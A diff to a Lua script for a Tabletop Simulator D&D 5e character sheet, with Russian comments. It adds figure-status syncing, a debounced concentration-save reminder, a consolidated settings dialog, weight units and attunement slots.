@@ -57,6 +57,31 @@ CHECKBOX_CHAR_EMPTY = ''
 -- обычной отметки мастерства.
 CHECKBOX_CHAR_EXPERTISE = string.char(9733)
 
+--============================================================
+-- СИНХРОНИЗАЦИЯ СО СТАТУСАМИ ФИГУРКИ (Маркиратор)
+--
+-- Лист можно привязать к одной фигурке, промаркированной Маркиратором:
+-- ПКМ по листу -> "Привязать фигурку", затем навести курсор на фигурку и
+-- нажать Tab (обычный игровой пинг). Дальше синхронизация ПОЛНОСТЬЮ
+-- событийная — никакого периодического опроса: лист один раз
+-- регистрируется у фигурки, и та сама присылает обновление своих
+-- миниатюрных иконок (self.UI) в момент реального изменения статусов.
+-- Подробности и весь код — в конце файла.
+--
+-- STATUS_ICONS_UI_POSITION/ROTATION/SCALE — координаты панели иконок в
+-- системе self.UI (это НЕ то же самое, что pos = {x,y,z} у кнопок листа
+-- ниже). Подбираются так же, как и всё остальное в этом файле: меняете
+-- значение -> Save & Apply -> смотрите на лист в игре -> повторяете.
+-- Если иконки не видны или показываются "не той стороной", в первую
+-- очередь попробуйте другой ROTATION (частые рабочие варианты: "0 0 0",
+-- "90 0 0", "180 0 0").
+--============================================================
+STATUS_ICONS_UI_POSITION   = "100 -162 -10"  -- позиция панели иконок (self.UI)
+STATUS_ICONS_UI_ROTATION   = "0 0 180"    -- поворот панели иконок (self.UI)
+STATUS_ICONS_UI_SCALE      = "0.1 0.1 0.1"
+STATUS_ICONS_PANEL_WIDTH   = 1200         -- ширина панели в пикселях UI (влияет на перенос иконок по строкам)
+STATUS_ICON_SIZE           = 90          -- размер одной иконки в пикселях UI
+
 -- Таблица уровней по опыту (D&D 5e): диапазон опыта -> уровень и бонус мастерства
 LVL_BY_EXP = {
     {
@@ -2447,13 +2472,34 @@ steps = {1, 5},
     hitDiceLeft = 1,             -- оставшееся количество костей хитов
     monetWeight = 0,             -- вес монет (в фунтах)
     lockMode = 0,                -- режим блокировки: 0 - нет, 1 - частичная, 2 - полная
-    injuries = {},               -- активные травмы: [paramId/RESOURCE_COUNTER_HP_MAX_ID/TEXTBOX_SPEED_ID] = величина
+    injuries = {},               -- активные травмы: [paramId/TEXTBOX_SPEED_ID] = величина
+    tempMaxHpModifier = 0,       -- текущее активное временное изменение Максимума хитов (состояние: новый ввод замещает, пустой ввод сбрасывает в 0) — см. блок "ВРЕМЕННОЕ ИЗМЕНЕНИЕ МАКСИМУМА ХИТОВ"
     exhaustion = {level = 0, ruleset = "2024"}, -- уровень истощения 0-6 и набор правил, см. блок "ИСТОЩЕНИЕ" ниже
     acBonuses = {}, -- до 5 именованных бонусов к КД (слоты 1-5), см. блок "БОНУСЫ К КД" ниже
+    attunement = {}, -- до 3 названий предметов настройки (слоты 1-3), см. блок "НАСТРОЙКА НА МАГИЧЕСКИЕ ПРЕДМЕТЫ" ниже
     useTempHp = true, -- временные хиты поглощают урон при уменьшении текущих (вкл/выкл через ПКМ)
+    --============================================================
+    -- КОНЦЕНТРАЦИЯ (D&D 5e)
+    --
+    -- concentrationActive НЕ переключается вручную — это зеркало статуса
+    -- "Концентрация" привязанной фигурки (Маркиратор), приходит само через
+    -- канал синхронизации статусов (см. syncConcentrationFromFigureStates
+    -- и блок "КОНЦЕНТРАЦИЯ" ниже по файлу).
+    -- concentrationReminderEnabled — это уже настройка ("нужно ли вообще
+    -- напоминать в чат"), лежит в диалоге настроек, как и useTempHp.
+    --============================================================
+    concentrationActive = false,
+    concentrationReminderEnabled = true,
     -- diceSpawnPoint: nil (по умолчанию — точка спавна кубиков считается
     -- от листа, см. DICE_SPAWN_LOCAL_POS) либо {x, y, z} в МИРОВЫХ координатах,
     -- если игрок задал точку вручную через ПКМ, см. блок "ТОЧКА СПАВНА КУБИКОВ"
+    linkedFigureGuid = nil, -- GUID фигурки (Маркиратор), привязанной к листу для показа иконок статусов; nil = не привязана
+    -- [НОВОЕ] Цвет книги заклинаний, привязанной к ЭТОМУ листу (обратная
+    -- ссылка к связи "книга -> лист", см. globalState.characterSheetGuid в
+    -- Гримуар_.lua) — выставляется книгой сразу после привязки листа
+    -- (SetOwnerBookColor). Нужен для клик-таргетинга: фигурка -> лист ->
+    -- цвет книги, см. GetOwnerBookColor ниже.
+    ownerBookColor = nil,
 
     --============================================================
     -- ЕДИНИЦЫ ИЗМЕРЕНИЯ (переключаются через ПКМ)
@@ -2468,6 +2514,18 @@ steps = {1, 5},
     waterUnitMetric = false,  -- false = галлоны, true = литры
     heightUnitMetric = false, -- false = футы, true = сантиметры
     heightFeetCanonical = 0,  -- рост персонажа в футах (канонически, см. выше)
+
+    -- Грузоподъёмность и "поднять/толкнуть/потащить" считаются из Силы по
+    -- правилам D&D в фунтах (см. updateJumpAndWeight ниже) — это КАНОНИЧЕСКАЯ
+    -- единица расчёта и не зависит от переключателя. weightUnitMetric влияет
+    -- только на то, в чём показывается результат (фунты или кг), как и три
+    -- флага выше. weightCapacityLb/raiseLiftPullLb — канонические значения в
+    -- фунтах, пересчитываемые в updateJumpAndWeight и используемые
+    -- checkOvercumbrance для сравнения с весом монет (тоже в фунтах),
+    -- независимо от того, в чём сейчас отображается лимит.
+    weightUnitMetric = false, -- false = фунты, true = килограммы
+    weightCapacityLb = 0,
+    raiseLiftPullLb = 0,
 }
 
 -- Параметры кнопки "Обновить уровень" в выключенном (невидимом) состоянии
@@ -2587,6 +2645,19 @@ end
 
 -- Если поле textboxId сейчас пустое — подставляет туда defaultValue (и как
 -- обычное число, значит его по-прежнему можно дополнить формулой вручную)
+--
+-- [ИСПРАВЛЕНО] input_function (в отличие от click_function у кнопок)
+-- выполняется в TTS ТОЛЬКО у того клиента, который реально печатал и потерял
+-- фокус в поле — у остальных клиентов синхронизируется только "сырой" текст
+-- поля (стало пустым), сама Lua-логика на их машинах не запускается вовсе.
+-- Из-за этого правка через self.editInput(), отправленная сразу же (в этом
+-- же кадре) с машины печатавшего игрока, проигрывает гонку с "официальной"
+-- фиксацией пустого значения поля у remote-клиентов (TTS применяет commit
+-- значения input'а не синхронно с колбэком, а чуть позже) — и на их экранах
+-- остаётся пусто. Тот же приём отката значения "через кадр", что уже
+-- используется в click_textbox для заблокированных полей, здесь решает
+-- ту же проблему: правка приходит уже ПОСЛЕ того, как пустое значение
+-- зафиксируется у всех, а не до этого.
 function fillTextboxDefaultIfEmpty(textboxId, defaultValue)
     local entry = ref_buttonData.textbox[textboxId]
     if entry == nil then return end
@@ -2596,10 +2667,15 @@ function fillTextboxDefaultIfEmpty(textboxId, defaultValue)
         entry.value = defaultValue
         local inputIndex = inputIndexByElementIdTable[textboxId]
         if inputIndex ~= nil then
-            self.editInput({
-                index = inputIndex,
-                value = defaultValue,
-            })
+            Wait.frames(
+                function()
+                    self.editInput({
+                        index = inputIndex,
+                        value = defaultValue,
+                    })
+                end,
+                1
+            )
         end
     end
 end
@@ -2799,110 +2875,229 @@ local LOCK_FLIP_ROTATION = {0, 0, 180}
 -- Обычный, не повёрнутый вид поля (разблокировано)
 local UNLOCK_ROTATION = {0, 0, 0}
 
--- Подписи пунктов меню для каждого режима блокировки
--- Метки для переключателя набора правил истощения в контекстном меню (см.
--- updateLockContextMenu ниже и setExhaustionRuleset в блоке "ИСТОЩЕНИЕ")
-local exhaustionRulesetLabels = {
-    ["2014"] = "Истощение по: 5.5e",
-    ["2024"] = "Истощение по: 5e",
-}
-local exhaustionRulesetOrder = {"2014", "2024"}
+-- Есть ли хоть одна активная травма — используется, чтобы прятать пункт
+-- "Снять травмы" из контекстного меню, когда снимать нечего
+function hasAnyInjuries()
+    return next(ref_buttonData.injuries) ~= nil
+end
 
-local lockModeLabels = {
-    [0] = "Разблокировать            лист",
-    [1] = "Частичная            блокировка",
-    [2] = "Заблокировать лист",
-}
-
--- Метки переключателя "временные хиты поглощают урон" в контекстном меню —
--- как и для lockMode/exhaustionRuleset, показываем метку ЦЕЛЕВОГО состояния
--- (того, в которое переключит клик), а не текущего
-local tempHpAbsorptionLabels = {
-    [true] = "Врем. хиты поглощают урон: Вкл",
-    [false] = "Врем. хиты поглощают урон: Выкл",
-}
-
--- Метки переключателей единиц измерения (Пища/Питьё/Рост) в контекстном
--- меню — как и остальные переключатели, показываем метку ЦЕЛЕВОГО состояния
--- (в которое переключит клик). Объявлены здесь (а не рядом с остальным
--- блоком "ЕДИНИЦЫ ИЗМЕРЕНИЯ" ниже), потому что updateLockContextMenu их
--- использует, а Lua-локали видны только коду, объявленному НИЖЕ по файлу —
--- объявление после функции превратило бы обращение в nil (глобальную).
-local foodUnitLabels = {
-    [true] = "Пища: килограммы",
-    [false] = "Пища: фунты",
-}
-local waterUnitLabels = {
-    [true] = "Питьё: литры",
-    [false] = "Питьё: галлоны",
-}
-local heightUnitLabels = {
-    [true] = "Рост: сантиметры",
-    [false] = "Рост: футы",
-}
-
--- Пересоздаёт контекстное меню: показывает пункты для двух режимов,
--- отличных от текущего (не циклический перебор, а прямой выбор), плюс
--- статичные пункты управления травмами
+-- Пересоздаёт контекстное меню (ПКМ). Все переключатели-настройки (блокировка
+-- листа, набор правил истощения, поглощение урона временными хитами, единицы
+-- измерения) собраны в ОДНОМ пункте "Настройки", открывающем диалоговое окно
+-- через нативный showOptionsDialog (см. блок "ДИАЛОГ НАСТРОЕК" ниже) — раньше
+-- это были 8+ отдельных строк меню. Разовые действия (травмы, временное
+-- изменение Максимума хитов, бонус к КД, точка спавна кубиков) остаются
+-- прямыми пунктами меню, но пункты снятия травмы/удаления бонуса
+-- показываются только когда действительно есть что снимать/удалять.
 function updateLockContextMenu()
     self.clearContextMenu()
 
-    for mode = 0, 2 do
-        if mode ~= ref_buttonData.lockMode then
-            local targetMode = mode
-            self.addContextMenuItem(lockModeLabels[targetMode], function(playerColor)
-                setLockMode(targetMode)
-            end)
-        end
-    end
+    self.addContextMenuItem("⚙ Настройки", onClickOpenSettings)
 
     self.addContextMenuItem("Получить травму", onClickGetInjury)
-    self.addContextMenuItem("Снять травмы", onClickRemoveInjuries)
-
-    for _, ruleset in ipairs(exhaustionRulesetOrder) do
-        if ruleset ~= ref_buttonData.exhaustion.ruleset then
-            local targetRuleset = ruleset
-            self.addContextMenuItem(exhaustionRulesetLabels[targetRuleset], function(playerColor)
-                setExhaustionRuleset(targetRuleset)
-            end)
-        end
+    if hasAnyInjuries() then
+        self.addContextMenuItem("Снять травмы", onClickRemoveInjuries)
     end
 
-    self.addContextMenuItem("Создать бонус к КД", onClickCreateAcBonus)
-    self.addContextMenuItem("Удалить бонус к КД", onClickRemoveAcBonus)
+    self.addContextMenuItem("Добавить временные Макс. Хиты \\ Временно отнять Макс. Хиты", onClickChangeTempMaxHp)
 
-    local targetUseTempHp = not ref_buttonData.useTempHp
-    self.addContextMenuItem(tempHpAbsorptionLabels[targetUseTempHp], function(playerColor)
-        setUseTempHp(targetUseTempHp)
-    end)
+    self.addContextMenuItem("Создать бонус КД", onClickCreateAcBonus)
+    if hasAnyAcBonuses() then
+        self.addContextMenuItem("Изменить бонус КД", onClickEditAcBonus)
+        self.addContextMenuItem("Удалить бонус КД", onClickRemoveAcBonus)
+    end
 
     if ref_buttonData.diceSpawnPoint ~= nil then
-        self.addContextMenuItem("Сбросить точку появления кубиков", onClickResetDiceSpawnPoint)
+        self.addContextMenuItem("Сбросить точку            появления кубиков", onClickResetDiceSpawnPoint)
     else
-        self.addContextMenuItem("Новое место появления кубиков", onClickSetDiceSpawnPoint)
+        self.addContextMenuItem("Новое место            появления кубиков", onClickSetDiceSpawnPoint)
     end
 
-    local targetFoodUnitMetric = not ref_buttonData.foodUnitMetric
-    self.addContextMenuItem(foodUnitLabels[targetFoodUnitMetric], function(playerColor)
-        setFoodUnitMetric(targetFoodUnitMetric)
-    end)
-
-    local targetWaterUnitMetric = not ref_buttonData.waterUnitMetric
-    self.addContextMenuItem(waterUnitLabels[targetWaterUnitMetric], function(playerColor)
-        setWaterUnitMetric(targetWaterUnitMetric)
-    end)
-
-    local targetHeightUnitMetric = not ref_buttonData.heightUnitMetric
-    self.addContextMenuItem(heightUnitLabels[targetHeightUnitMetric], function(playerColor)
-        setHeightUnitMetric(targetHeightUnitMetric)
-    end)
+    if ref_buttonData.linkedFigureGuid ~= nil then
+        local linkedFigure = getObjectFromGUID(ref_buttonData.linkedFigureGuid)
+        local linkedFigureName = (linkedFigure ~= nil) and linkedFigure.getName() or ""
+        if linkedFigureName == "" then linkedFigureName = "фигурка" end
+        self.addContextMenuItem("🔗 Привязана: " .. linkedFigureName, function() end)
+        self.addContextMenuItem("Отвязать фигурку", onClickUnlinkFigure)
+    elseif pendingLinkFigureColor ~= nil then
+        self.addContextMenuItem("⏳ Киньте фигурку на лист...", function() end)
+        self.addContextMenuItem("Отменить привязку", onClickCancelLinkFigure)
+    else
+        self.addContextMenuItem("Привязать фигурку", onClickLinkFigure)
+    end
 end
 
 -- Переключает режим "временные хиты поглощают урон" (вызывается из контекстного меню)
 function setUseTempHp(value)
     ref_buttonData.useTempHp = value
+    updateSave()
+end
+
+--============================================================
+-- КОНЦЕНТРАЦИЯ (D&D 5e)
+--
+-- concentrationActive НЕ переключается вручную — это зеркало статуса
+-- "Концентрация" (см. CONCENTRATION_STATUS_NAME) у ПРИВЯЗАННОЙ фигурки
+-- (Маркиратор). Источник правды — фигурка: замаркировали иконку
+-- "Концентрация" над головой — лист узнаёт об этом через уже существующий
+-- канал синхронизации статусов (OnFigureStatusChanged, см. блок
+-- "СИНХРОНИЗАЦИЯ СО СТАТУСАМИ ФИГУРКИ" в конце файла) и обновляет
+-- concentrationActive сам, без отдельного клика по листу. Без привязанной
+-- фигурки лист в принципе не может знать, концентрируется ли персонаж —
+-- поэтому concentrationActive всегда false, пока фигурка не привязана
+-- (см. forgetLinkedFigure).
+--
+-- concentrationReminderEnabled — настройка (лежит в "⚙ Настройки"): нужно
+-- ли вообще присылать в чат напоминание при уроне, пока концентрация
+-- активна. Отдельно от concentrationActive, поскольку это осознанный выбор
+-- стола (один раз на партию), а не игровое состояние персонажа.
+--
+-- Напоминание срабатывает из click_resource_counter (см. ниже по файлу)
+-- при любом уменьшении текущих ИЛИ временных хитов — ровно то же самое
+-- событие, на котором уже держится подсветка травм/истощения (см.
+-- refreshFieldTint), поэтому отдельного "перехвата" урона заводить не
+-- понадобилось.
+--============================================================
+
+-- Имя статуса в реестре Маркиратора, которое считается "концентрацией".
+-- Должно СОВПАДАТЬ буква в букву с ключом STATUS_REGISTRY в скрипте
+-- фигурки (Маркиратор) — там это статус "Концентрация".
+local CONCENTRATION_STATUS_NAME = "Концентрация"
+
+-- Правило D&D 5e: спасбросок Телосложения от потери концентрации,
+-- СЛ = наибольшее из 10 и (полученный урон / 2), с округлением вниз
+function getConcentrationSaveDC(damage)
+    return math.max(10, math.floor(damage / 2))
+end
+
+--------------------------------------------------------------------
+-- Дебаунс напоминания о концентрации.
+--
+-- Проблема: урон почти всегда наносится несколькими кликами подряд
+-- (например 3 клика по -5), а иногда после "перебора" его же подправляют
+-- кликом(-ами) + в другую сторону. Если слать announceConcentrationDamage
+-- на каждый клик — в чат улетит несколько сообщений с разными СЛ вместо
+-- одного правильного.
+--
+-- Решение: не считать каждый клик отдельно и не сверять "значение до" со
+-- "значением после" (это ненадёжно — временные хиты дробят один урон между
+-- двумя счётчиками, см. click_resource_counter, а конечное значение к тому
+-- же клампится к 0 — по правилам концентрации СЛ должна считаться от
+-- ЗАПРОШЕННОГО урона, а не от фактической потери хитов, см. комментарий
+-- ниже в click_resource_counter). Вместо этого копим АЛГЕБРАИЧЕСКУЮ сумму
+-- запрошенных изменений (concentrationPendingDamage, знак минус к amount:
+-- урон копится с плюсом, лечение/коррекция — с минусом) и на каждый клик по
+-- текущим/временным хитам ПЕРЕЗАПУСКАЕМ таймер на
+-- CONCENTRATION_DEBOUNCE_SECONDS. Сообщение уходит только когда клики
+-- прекратились и таймер спокойно досчитал до конца — т.е. один раз на
+-- "пачку" кликов, с итоговым суммарным уроном.
+--------------------------------------------------------------------
+
+-- Сколько секунд тишины после последнего клика ждать перед тем, как
+-- посчитать итоговый урон и (если он положительный) вывести напоминание.
+CONCENTRATION_DEBOUNCE_SECONDS = 5
+
+-- Накопленный за текущее окно "запрошенный" урон (может стать отрицательным,
+-- если урон перебрали и потом подправили кликом + — тогда напоминания не
+-- будет). Обнуляется при каждом срабатывании flushConcentrationDamage.
+concentrationPendingDamage = 0
+
+-- id текущего отложенного вызова Wait.time (нужен, чтобы отменить его и
+-- поставить заново при каждом новом клике) или nil, если таймер не запущен.
+concentrationDebounceWaitId = nil
+
+-- Регистрирует ещё один клик по текущим/временным хитам в окне дебаунса и
+-- (пере)запускает таймер. delta — это ЗАПРОШЕННОЕ изменение хитов ЭТИМ
+-- кликом со знаком amount из click_resource_counter (отрицательное — урон,
+-- положительное — лечение или коррекция "перебора" урона).
+function registerConcentrationHpDelta(delta)
+    if delta == nil or delta == 0 then return end
+    -- Если концентрация не активна или напоминания выключены — копить
+    -- нечего, announceConcentrationDamage внутри flush всё равно ничего не
+    -- сделает; не заводим таймер впустую (в т.ч. чтобы не оставлять его
+    -- "висеть", если напоминания выключат по ходу набора кликов).
+    if ref_buttonData.concentrationActive ~= true or ref_buttonData.concentrationReminderEnabled ~= true then
+  return
+    end
+
+    concentrationPendingDamage = concentrationPendingDamage - delta
+
+    if concentrationDebounceWaitId ~= nil then
+  Wait.stop(concentrationDebounceWaitId)
+    end
+    concentrationDebounceWaitId = Wait.time(flushConcentrationDamage, CONCENTRATION_DEBOUNCE_SECONDS)
+end
+
+-- Срабатывает через CONCENTRATION_DEBOUNCE_SECONDS после ПОСЛЕДНЕГО клика по
+-- хитам в серии. Если суммарно вышел урон (а не лечение/полная компенсация
+-- "перебора") — выводит ОДНО напоминание с итоговой СЛ.
+function flushConcentrationDamage()
+    concentrationDebounceWaitId = nil
+    local damage = concentrationPendingDamage
+    concentrationPendingDamage = 0
+
+    if damage > 0 then
+  announceConcentrationDamage(damage)
+    end
+end
+
+-- Сверяет concentrationActive с набором статусов, присланным привязанной
+-- фигуркой (data.states из OnFigureStatusChanged) — вызывается оттуда при
+-- каждом обновлении. Обновляет UI/сохранение, только если состояние реально
+-- поменялось (та же логика, что и у остальной синхронизации статусов —
+-- не дёргаем self.editButton/updateSave впустую на каждое чужое уведомление).
+function syncConcentrationFromFigureStates(states)
+    local isActive = (states ~= nil and states[CONCENTRATION_STATUS_NAME] == true)
+    if ref_buttonData.concentrationActive == isActive then
+        return
+    end
+
+    ref_buttonData.concentrationActive = isActive
     updateLockContextMenu()
     updateSave()
+end
+
+-- Переключает саму настройку "показывать ли напоминание в чат" (вызывается
+-- из диалога "⚙ Настройки")
+function setConcentrationReminderEnabled(value)
+    ref_buttonData.concentrationReminderEnabled = value
+    updateSave()
+end
+
+-- Если концентрация сейчас активна (по статусу привязанной фигурки) и
+-- напоминания включены — выводит в общий чат подсказку с готовой СЛ
+-- спасброска. Ничего не проверяет и не снимает концентрацию автоматически
+-- (лист не бросает этот спасбросок сам и не решает, устоял ли персонаж) —
+-- это осознанно оставлено на усмотрение игрока/мастера, лист только считает
+-- СЛ и напоминает не забыть бросок.
+--
+-- [ИСПРАВЛЕНО] Раньше здесь ЕЩЁ РАЗ проверялось ref_buttonData.concentrationActive
+-- — то же самое, что уже проверяет registerConcentrationHpDelta ДО того, как
+-- урон вообще попадёт в накопитель (concentrationPendingDamage). Так как
+-- между кликом по хитам и этим вызовом проходит CONCENTRATION_DEBOUNCE_SECONDS
+-- (см. блок "Дебаунс напоминания о концентрации" выше), концентрация вполне
+-- может успеть слететь за это время (сняли статус, начали действие,
+-- завершился бой и т.п.) — повторная проверка ЗДЕСЬ то и дело "съедала"
+-- уже честно накопленный урон и напоминание молча пропадало, хотя урон был
+-- получен именно во время концентрации. Повторную проверку убрали: раз урон
+-- вообще попал в pendingDamage, значит на момент удара концентрация была
+-- активна, и напомнить нужно в любом случае. Проверку
+-- concentrationReminderEnabled оставили — это осознанный "рубильник"
+-- напоминаний в целом, его стоит уважать даже для уже отложенного сообщения.
+function announceConcentrationDamage(damage)
+    if ref_buttonData.concentrationReminderEnabled ~= true then return end
+    if damage == nil or damage <= 0 then return end
+
+    local charSheetName = self.getName()
+    if charSheetName == nil or charSheetName == "" then charSheetName = "Персонаж" end
+    local charSheetColor = colorToHex(self.getColorTint())
+    local dc = getConcentrationSaveDC(damage)
+
+    broadcastToAll(
+        "🎯 ["..charSheetColor.."][b][i]"..charSheetName.."[/i][/b][-] держит концентрацию и получил "..damage
+        .." урона — нужен спасбросок [b]Телосложения[/b] (СЛ "..dc.."), чтобы не потерять концентрацию.",
+        {1, 0.85, 0.3}
+    )
 end
 
 --============================================================
@@ -2917,7 +3112,7 @@ end
 --   - при переключении единицы (setFoodUnitMetric/setWaterUnitMetric)
 --     число РЕАЛЬНО конвертируется и округляется кратно 0.5, а не просто
 --     переформатируется — иначе шаги "плыли" бы дробными хвостами.
--- Рост — текстовое поле, а не счётчик с шагами, поэтому для него канонiческое
+-- Рост — текстовое поле, а не счётчик с шагами, поэтому для него каноническое
 -- хранение в футах (heightFeetCanonical) осталось прежним — там нет проблемы
 -- "дробного шага", т.к. пользователь просто печатает число заново.
 --============================================================
@@ -2980,6 +3175,10 @@ local waterUnitTooltip = {
     [false] = "Галлоны",
     [true] = "Литры",
 }
+local weightUnitTooltip = {
+    [false] = "Фунты",
+    [true] = "Килограммы",
+}
 
 -- Переключает единицу пищи (фунты <-> кг), КОНВЕРТИРУЯ уже накопленное
 -- значение (а не просто меняя подпись), и округляет результат кратно 0.5
@@ -3028,7 +3227,6 @@ function setFoodUnitMetric(value)
     end
 
     updateMonetWeight()
-    updateLockContextMenu()
     updateSave()
 end
 
@@ -3081,7 +3279,6 @@ function setWaterUnitMetric(value)
     end
 
     updateMonetWeight()
-    updateLockContextMenu()
     updateSave()
 end
 
@@ -3104,8 +3301,181 @@ function setHeightUnitMetric(value)
         value = displayValue,
     })
 
-    updateLockContextMenu()
     updateSave()
+end
+
+-- Переключает единицу отображения грузоподъёмности и "поднять/толкнуть/
+-- потащить" (фунты <-> кг). В отличие от пищи/питья, здесь НЕТ хранимого
+-- накопленного значения для конвертации — оба показателя всегда пересчитываются
+-- заново из Силы (см. updateJumpAndWeight), поэтому переключатель просто
+-- меняет флаг и просит пересчитать дисплеи в новой единице.
+function setWeightUnitMetric(value)
+    ref_buttonData.weightUnitMetric = value
+    updateJumpAndWeight()
+    updateSave()
+end
+
+--============================================================
+-- ДИАЛОГ НАСТРОЕК (ПКМ -> "⚙ Настройки")
+--
+-- Раньше все переключатели (блокировка листа, набор правил истощения,
+-- поглощение урона временными хитами, 4 единицы измерения) были отдельными
+-- строками в контекстном меню ПКМ (см. updateLockContextMenu выше). Здесь
+-- они собраны в одном пункте меню, который через нативный TTS-диалог
+-- Player[playerColor].showOptionsDialog (тот же способ, что уже используется
+-- в файле для выбора величины травмы/бонуса к КД, см. onClickGetInjury/
+-- onClickRemoveAcBonus) открывает древовидное меню "Настройки":
+--
+--   ⚙ Настройки
+--     ├─ Блокировка листа        -> подменю из 3 вариантов
+--     ├─ Истощение: правила      -> подменю из 2 вариантов
+--     ├─ Врем. хиты поглощают урон: Вкл/Выкл  -> переключается сразу же
+--     └─ Единицы измерения       -> подменю из 4 переключателей (Рост/
+--                                    Пища/Питьё/Грузоподъёмность в ОДНОМ
+--                                    подпункте, как и просили)
+--
+-- Никакого Custom UI/XML — только встроенные диалоги TTS, без загрузки
+-- собственной разметки и без self.UI.
+--============================================================
+
+-- Подписи для трёх режимов блокировки — используются в меню настроек
+local lockModeNames = {
+    [0] = "Разблокирован",
+    [1] = "Частичная блокировка",
+    [2] = "Заблокирован",
+}
+local lockModeOrder = {0, 1, 2}
+
+-- Подписи для двух наборов правил истощения — используются в меню настроек
+local exhaustionRulesetNames = {
+    ["2014"] = "5.5e (2014)",
+    ["2024"] = "5e (2024)",
+}
+local exhaustionRulesetOrder = {"2014", "2024"}
+
+-- Пункт "‹ Назад"/"Отмена", используется в подменю, чтобы выйти без изменений
+local BACK_OPTION = "‹ Назад"
+
+-- Открывает главное меню настроек (пункт ПКМ "⚙ Настройки"). Пункты
+-- блокировки листа вынесены прямо сюда, на верхний уровень (не в отдельное
+-- подменю) — три строки с галочкой у активного режима, выбор любой из них
+-- (включая уже активную) применяет режим и переоткрывает это же меню.
+-- Остальные пункты показывают текущее значение и либо переключаются сразу
+-- ("Врем. хиты"), либо ведут в своё подменю ("Истощение", "Единицы измерения").
+function openSettingsMenu(playerColor)
+    local options = {}
+    local lockModeByOptionIndex = {}
+
+    for _, mode in ipairs(lockModeOrder) do
+        local prefix = (ref_buttonData.lockMode == mode) and "✓ " or "   "
+        table.insert(options, prefix..lockModeNames[mode])
+        lockModeByOptionIndex[#options] = mode
+    end
+
+    table.insert(options, "Истощение — правила: "..exhaustionRulesetNames[ref_buttonData.exhaustion.ruleset])
+    local exhaustionOptionIndex = #options
+
+    table.insert(options, "Врем. хиты поглощают урон: "..(ref_buttonData.useTempHp and "Вкл" or "Выкл"))
+    local tempHpOptionIndex = #options
+
+    table.insert(options, "Напоминание о концентрации при уроне: "..(ref_buttonData.concentrationReminderEnabled and "Вкл" or "Выкл"))
+    local concentrationReminderOptionIndex = #options
+
+    table.insert(options, "Единицы измерения")
+    local unitsOptionIndex = #options
+
+    table.insert(options, "Закрыть")
+
+    Player[playerColor].showOptionsDialog(
+        "⚙ Настройки листа персонажа",
+        options,
+        ref_buttonData.lockMode + 1,
+        function(selectedText, selectedIndex)
+            if lockModeByOptionIndex[selectedIndex] ~= nil then
+                setLockMode(lockModeByOptionIndex[selectedIndex])
+                openSettingsMenu(playerColor)
+            elseif selectedIndex == exhaustionOptionIndex then
+                openExhaustionRulesetMenu(playerColor)
+            elseif selectedIndex == tempHpOptionIndex then
+                setUseTempHp(not ref_buttonData.useTempHp)
+                openSettingsMenu(playerColor)
+            elseif selectedIndex == concentrationReminderOptionIndex then
+                setConcentrationReminderEnabled(not ref_buttonData.concentrationReminderEnabled)
+                openSettingsMenu(playerColor)
+            elseif selectedIndex == unitsOptionIndex then
+                openUnitsMenu(playerColor)
+            end
+            -- последний пункт ("Закрыть") — ничего не делаем, диалог просто закрывается
+        end
+    )
+end
+
+-- ПКМ -> "⚙ Настройки"
+function onClickOpenSettings(playerColor)
+    openSettingsMenu(playerColor)
+end
+
+-- Подменю "Истощение — правила"
+function openExhaustionRulesetMenu(playerColor)
+    local options = {}
+    local currentSelectedIndex = 1
+    for i, ruleset in ipairs(exhaustionRulesetOrder) do
+        local isCurrent = ref_buttonData.exhaustion.ruleset == ruleset
+        if isCurrent then currentSelectedIndex = i end
+        local prefix = isCurrent and "✓ " or "   "
+        table.insert(options, prefix..exhaustionRulesetNames[ruleset])
+    end
+    table.insert(options, BACK_OPTION)
+
+    Player[playerColor].showOptionsDialog(
+        "Истощение — набор правил",
+        options,
+        currentSelectedIndex,
+        function(selectedText, selectedIndex)
+            if selectedIndex <= #exhaustionRulesetOrder then
+                setExhaustionRuleset(exhaustionRulesetOrder[selectedIndex])
+            end
+            openSettingsMenu(playerColor)
+        end
+    )
+end
+
+-- Подменю "Единицы измерения" — Рост/Пища/Питьё/Грузоподъёмность собраны
+-- в ОДНОМ подпункте главного меню (см. openSettingsMenu выше), как и
+-- просили. Каждый пункт показывает текущую единицу и переключает на
+-- противоположную при выборе, оставаясь в этом же подменю, чтобы можно
+-- было переключить несколько единиц подряд, не открывая меню заново.
+function openUnitsMenu(playerColor)
+    local options = {
+        "Рост: "..(ref_buttonData.heightUnitMetric and "сантиметры" or "футы"),
+        "Пища: "..(ref_buttonData.foodUnitMetric and "килограммы" or "фунты"),
+        "Питьё: "..(ref_buttonData.waterUnitMetric and "литры" or "галлоны"),
+        "Грузоподъёмность: "..(ref_buttonData.weightUnitMetric and "килограммы" or "фунты"),
+        BACK_OPTION,
+    }
+
+    Player[playerColor].showOptionsDialog(
+        "Единицы измерения",
+        options,
+        1,
+        function(selectedText, selectedIndex)
+            if selectedIndex == 1 then
+                setHeightUnitMetric(not ref_buttonData.heightUnitMetric)
+                openUnitsMenu(playerColor)
+            elseif selectedIndex == 2 then
+                setFoodUnitMetric(not ref_buttonData.foodUnitMetric)
+                openUnitsMenu(playerColor)
+            elseif selectedIndex == 3 then
+                setWaterUnitMetric(not ref_buttonData.waterUnitMetric)
+                openUnitsMenu(playerColor)
+            elseif selectedIndex == 4 then
+                setWeightUnitMetric(not ref_buttonData.weightUnitMetric)
+                openUnitsMenu(playerColor)
+            else
+                openSettingsMenu(playerColor)
+            end
+        end
+    )
 end
 
 --============================================================
@@ -3140,10 +3510,18 @@ function onClickResetDiceSpawnPoint(playerColor)
 end
 
 -- Глобальный хук TTS: вызывается, когда игрок пингует стол (Tab) — стандартный
--- встроенный способ показать место другим игрокам, его же используем, чтобы
--- задать точку появления кубиков. TTS передаёт объект Player (не просто цвет)
--- и позицию с полями .x/.y/.z (не числовые индексы).
+-- встроенный способ показать место другим игрокам. Используется для двух
+-- независимых режимов ожидания (у каждого свой pending*-флаг, поэтому они
+-- не мешают друг другу): задать точку появления кубиков и привязать
+-- фигурку к листу (см. блок "СИНХРОНИЗАЦИЯ СО СТАТУСАМИ ФИГУРКИ" в конце
+-- файла). TTS передаёт объект Player (не просто цвет) и позицию с полями
+-- .x/.y/.z (не числовые индексы).
 function onPlayerPing(player, position)
+    if pendingLinkFigureColor == player.color then
+        onPingLinkFigure(player, position)
+        return
+    end
+
     if pendingDiceSpawnPointColor ~= player.color then
         return
     end
@@ -3162,21 +3540,24 @@ function setLockMode(mode)
     applyTextboxLockVisuals()
     applyCounterLockVisuals()
     applyResourceCounterLockVisuals()
-    updateLockContextMenu()
     updateSave()
 end
 
 --============================================================
